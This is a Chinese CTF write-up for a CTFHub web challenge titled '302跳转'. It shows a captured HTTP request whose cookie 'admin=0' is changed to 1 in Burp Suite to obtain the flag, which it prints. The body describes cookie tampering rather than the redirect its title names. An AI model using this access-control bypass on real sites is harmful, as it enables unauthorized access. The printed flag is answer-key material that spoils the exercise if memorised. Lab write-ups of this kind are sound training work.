# CTFHUB_302跳转

## 题目内容

```html
hello guest. only admin can get flag.
```
## WriteUp
题目已知只有admin可以访问，我们还是使用burpsuite抓包看看

```
GET / HTTP/1.1
Host: challenge-5f3dd77d0fac4176.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412; admin=0
Connection: close
```

抓到数据包，在cookie出可以看到admin=0，我们将包send to repeater并给他改成1

获取到flag

```
HTTP/1.1 200 OK
Server: openresty/1.19.3.2
Date: Sat, 21 Aug 2021 07:01:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/5.6.40
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 32

ctfhub{cec4454dfccc2cf9ceabf92c}
```

